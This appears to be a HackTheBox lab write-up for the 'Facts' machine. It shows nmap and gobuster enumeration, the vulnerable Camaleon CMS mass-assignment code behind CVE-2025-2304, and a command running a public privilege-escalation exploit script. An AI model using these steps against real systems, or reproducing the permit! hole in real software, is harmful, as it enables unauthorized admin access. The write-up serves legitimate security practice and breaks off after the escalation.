### Facts-HackTheBox🏴󠁧󠁢󠁥󠁮󠁧󠁿

#### Recognition and Enumeration

**.First we need to prove the conexion with a ping.**
```bash
ping -c3 10.129.4.19
```

<img width="960" height="207" alt="image" src="https://github.com/user-attachments/assets/c53c3500-fba9-4de2-bc03-887548432919" />


** Now we need to search which are the open ports whith nmap.**
```bash
 nmap -p-  10.129.4.19
```

<img width="968" height="266" alt="image" src="https://github.com/user-attachments/assets/f1ea1201-9332-4531-8b8b-2371dd17bdb6" />


**We need to add to `/etc/hosts` the host of the machine.**

<img width="956" height="283" alt="image" src="https://github.com/user-attachments/assets/39e655e6-a592-47d3-9762-8f0cf278236f" />


**The website**

<img width="956" height="858" alt="image" src="https://github.com/user-attachments/assets/a48e23c7-d51c-41b3-9b73-d616bcd83daf" />



**Now we search the hidden diretory**
```bash
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirb/common.txt -b 403,404 -t 30
```

<img width="960" height="871" alt="image" src="https://github.com/user-attachments/assets/e2130361-0caa-4c40-9695-c9c504f51b92" />


**We are going to create an account.**

<img width="964" height="994" alt="image" src="https://github.com/user-attachments/assets/058832a5-561b-49bb-a2bf-9a30af532668" />


**Camaleon CMS v2.9.0 is quite outdated, and it's vulnerable to CVE-2025–2304.**
```bash
def updated_ajax
  user_params = params.require(:user).permit!  # DANGEROUS!
  current_user.update(user_params)
end
```

<img width="964" height="209" alt="image" src="https://github.com/user-attachments/assets/618000fb-610c-43c6-a1a7-a2f68e5b1e4c" />


**With https://github.com/CsuriBird/CVE-2025-2304 we can exploit a py to be an administrator.**
```bash
 python camaleon_cms_privilege_escalation.py \
                                 --url http://facts.htb \
                                 --username adri \
                                 --password adri \
                                 --new-password adri
```

<img width="959" height="722" alt="image" src="https://github.com/user-attachments/assets/04e32bbf-e7ec-467d-971f-0a26bbebd5af" />


<img width="743" height="613" alt="image" src="https://github.com/user-attachments/assets/78a53ce0-4bc5-4511-a444-35832c92a344" />


****









